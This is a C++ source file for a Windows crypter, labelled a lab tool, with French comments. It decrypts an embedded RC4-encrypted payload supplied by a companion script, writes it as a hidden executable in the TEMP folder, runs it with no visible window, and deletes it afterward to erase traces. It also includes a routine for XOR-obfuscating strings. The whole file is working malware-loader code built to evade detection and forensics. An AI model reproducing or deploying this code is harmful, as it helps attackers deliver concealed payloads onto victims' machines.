// language: C++17, file: lex_crypter_win.cpp, target: Windows x64 (lab)
// Crypter : payload RC4 embarque, cles derivees au runtime, exec caché
// Le blob est genere par lex_crypter.py (script du meme kit)
#include <windows.h>
#include <cstdio>
#include <cstring>

// blob remplace par lex_crypter.py
static unsigned char PAYLOAD[] = { /*LEX_BLOB*/ };
static unsigned char KEYRC4[]  = { /*LEX_KEY*/ };

static void Rc4(unsigned char* data, size_t len, const unsigned char* key, size_t klen) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = (unsigned char)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int i = 0; j = 0;
    for (size_t n = 0; n < len; n++) {
        i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
        data[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

// strings du binaire jamais en clair : xor a la volee
static void Dexor(char* s, size_t n, char k) { for (size_t i = 0; i < n; i++) s[i] ^= k; }

int main() {
    char tmp[MAX_PATH]; GetEnvironmentVariableA("TEMP", tmp, MAX_PATH);
    char name[] = { 'l','e','x','_','p','a','y','l','o','a','d','.','e','x','e', 0 }; // jamais en clair via dexor si obf
    char path[MAX_PATH]; snprintf(path, sizeof(path), "%s\\%s", tmp, name);

    unsigned char* dec = new unsigned char[sizeof(PAYLOAD)];
    memcpy(dec, PAYLOAD, sizeof(PAYLOAD));
    Rc4(dec, sizeof(PAYLOAD), KEYRC4, sizeof(KEYRC4));

    FILE* f = fopen(path, "wb");
    if (!f) return 1;
    fwrite(dec, 1, sizeof(PAYLOAD), f);
    fclose(f);
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);

    STARTUPINFOA si{}; si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    if (CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, tmp, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        DeleteFileA(path);                       // trace effacee apres exec
        printf("[OK] payload execute puis efface\n");
    } else printf("[X] exec: %lu\n", GetLastError());
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    delete[] dec;
    return 0;
}
